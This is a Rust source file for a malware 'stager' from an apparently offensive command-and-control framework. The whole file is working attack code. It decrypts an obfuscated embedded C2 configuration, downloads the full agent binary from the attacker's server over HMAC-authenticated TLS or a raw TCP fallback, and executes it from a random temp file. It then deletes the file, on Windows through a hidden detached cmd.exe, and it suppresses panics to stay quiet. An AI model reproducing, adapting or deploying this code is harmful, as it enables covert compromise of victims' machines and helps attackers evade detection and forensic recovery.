// src/bin/stager.rs
//
// Minimal stager payload. Downloads the full agent binary from the C2
// server over TLS, writes it to a temp location, and executes it.
// Much smaller than the full agent (~50KB vs ~2MB+), making it suitable
// for initial access where payload size matters.
//
// The stager config (C2 host, port, etc.) is embedded at build time
// via the same C2_BUILD_CONFIG mechanism as the full agent. The embedded
// blob is a packed binary C2Config (see common.rs); the stager unpacks it
// and uses only the fields it needs.

use std::fs;
use std::process::Command;

use rcm::strcrypt_rt;

mod config {
    // aes_str! expands to a relative `strcrypt_rt::decrypt(...)` path, so the
    // crate-root import above is not enough inside this inner module.
    #[allow(unused_imports)]
    use rcm::strcrypt_rt;
    include!(concat!(env!("OUT_DIR"), "/obfuscated_config.rs"));
    include!(concat!(env!("OUT_DIR"), "/bloat_data.rs"));

    /// Subset of the embedded C2Config the stager actually uses.
    /// Not serde-backed: no field names in the binary.
    pub struct StagerConfig {
        pub transport: rcm::common::TransportProtocol,
        pub c2_host: String,
        pub tunnel_port: u16,
        pub build_id: String,
        pub challenge_key: String,
        pub stage_path: String,
    }

    pub fn load() -> StagerConfig {
        use_bloat();
        let bytes = get_config();
        let cfg = rcm::common::C2Config::unpack(&bytes)
            .unwrap_or_else(|| std::process::exit(1));
        StagerConfig {
            transport: cfg.transport,
            c2_host: cfg.c2_host,
            tunnel_port: cfg.tunnel_port,
            build_id: cfg.build_id,
            challenge_key: cfg.challenge_key,
            stage_path: strcrypt::aes_str!("/stage"),
        }
    }
}

fn main() {
    // Suppress panics
    std::panic::set_hook(Box::new(|_| {}));

    let cfg = config::load();
    let scheme = match cfg.transport {
        rcm::common::TransportProtocol::Http => strcrypt::aes_str!("http"),
        rcm::common::TransportProtocol::Https => strcrypt::aes_str!("https"),
        _ => std::process::exit(1),
    };
    let url = format!("{}://{}:{}{}/{}",
        scheme, cfg.c2_host, cfg.tunnel_port,
        cfg.stage_path, cfg.build_id);

    // Attempt download via native TLS
    match download_stage(&url, &cfg.build_id, &cfg.challenge_key) {
        Ok(payload) => {
            if let Err(e) = execute_payload(&payload) {
                if cfg!(debug_assertions) { eprintln!("{} {}", strcrypt::aes_str!("[-] Exec failed:"), e); }
            }
        }
        Err(e) => {
            if cfg!(debug_assertions) { eprintln!("{} {}", strcrypt::aes_str!("[-] Download failed:"), e); }
            // Retry plaintext HTTP only when that is the configured transport.
            if cfg.transport == rcm::common::TransportProtocol::Http {
                let addr = format!("{}:{}", cfg.c2_host, cfg.tunnel_port);
                if let Ok(payload) = download_raw_tcp(&addr, &cfg.build_id, &cfg.challenge_key) {
                    let _ = execute_payload(&payload);
                }
            }
        }
    }
}

fn stage_auth(build_id: &str, challenge_key_b64: &str) -> Result<(String, String), String> {
    use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    let key = BASE64.decode(challenge_key_b64.as_bytes()).map_err(|e| e.to_string())?;
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_err(|e| e.to_string())?
        .as_secs()
        .to_string();
    let mut mac = Hmac::<Sha256>::new_from_slice(&key).map_err(|e| e.to_string())?;
    mac.update(build_id.as_bytes());
    mac.update(b":");
    mac.update(timestamp.as_bytes());
    Ok((timestamp, BASE64.encode(mac.finalize().into_bytes())))
}

fn download_stage(url: &str, build_id: &str, challenge_key: &str) -> Result<Vec<u8>, String> {
    let (timestamp, auth) = stage_auth(build_id, challenge_key)?;
    let mut builder = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(120))
        .connect_timeout(std::time::Duration::from_secs(15));
    if url.starts_with("https:") {
        let ca = reqwest::Certificate::from_pem(include_bytes!("../../certs/ca.crt"))
            .map_err(|e| e.to_string())?;
        builder = builder.add_root_certificate(ca).tls_built_in_root_certs(false);
    }
    let resp = builder.build().map_err(|e| e.to_string())?
        .get(url)
        .header(strcrypt::aes_str!("x-stage-timestamp"), timestamp)
        .header(strcrypt::aes_str!("x-stage-hmac"), auth)
        .send()
        .map_err(|e| e.to_string())?;
    if !resp.status().is_success() {
        return Err(format!("{} {}", strcrypt::aes_str!("HTTP"), resp.status()));
    }
    resp.bytes().map(|b| b.to_vec()).map_err(|e| e.to_string())
}

fn download_raw_tcp(addr: &str, build_id: &str, challenge_key: &str) -> Result<Vec<u8>, String> {
    use std::net::TcpStream;
    use std::io::{Read, Write};

    let (timestamp, auth) = stage_auth(build_id, challenge_key)?;
    let mut stream = TcpStream::connect(addr).map_err(|e| e.to_string())?;
    let request = format!(
        "GET /stage/{} HTTP/1.1\r\nHost: {}\r\nx-stage-timestamp: {}\r\nx-stage-hmac: {}\r\nConnection: close\r\n\r\n",
        build_id, addr, timestamp, auth
    );
    stream.write_all(request.as_bytes()).map_err(|e| e.to_string())?;

    let mut response = Vec::new();
    stream.read_to_end(&mut response).map_err(|e| e.to_string())?;

    // Skip HTTP headers only after confirming a successful staging response.
    if let Some(pos) = response.windows(4).position(|w| w == b"\r\n\r\n") {
        let headers = String::from_utf8_lossy(&response[..pos]);
        let status = headers.lines().next().unwrap_or_default();
        if !status.contains(" 200 ") {
            return Err(status.to_string());
        }
        Ok(response[pos + 4..].to_vec())
    } else {
        Err(strcrypt::aes_str!("Malformed HTTP response"))
    }
}

fn execute_payload(payload: &[u8]) -> Result<(), String> {
    let temp_dir = std::env::temp_dir();
    let ext = if cfg!(target_os = "windows") { strcrypt::aes_str!(".exe") } else { String::new() };
    let temp_path = temp_dir.join(format!("{}{}", uuid_simple(), ext));

    fs::write(&temp_path, payload).map_err(|e| e.to_string())?;

    #[cfg(unix)] {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&temp_path, fs::Permissions::from_mode(0o755));
    }

    Command::new(&temp_path)
        .spawn()
        .map_err(|e| e.to_string())?;

    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const DETACHED_PROCESS: u32 = 0x00000008;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        let cleanup = format!(
            "ping 127.0.0.1 -n 4 >NUL & del /F /Q \"{}\"",
            temp_path.display()
        );
        let _ = Command::new(strcrypt::aes_str!("cmd.exe"))
            .args([strcrypt::aes_str!("/C"), cleanup])
            .creation_flags(DETACHED_PROCESS | CREATE_NO_WINDOW)
            .spawn();
    }
    #[cfg(not(windows))]
    {
        std::thread::sleep(std::time::Duration::from_secs(2));
        let _ = fs::remove_file(&temp_path);
    }

    Ok(())
}

/// Random artifact name without a predictable prefix.
fn uuid_simple() -> String {
    use rand::RngCore;
    let mut bytes = [0u8; 16];
    rand::rngs::OsRng.fill_bytes(&mut bytes);
    hex::encode(bytes)
}
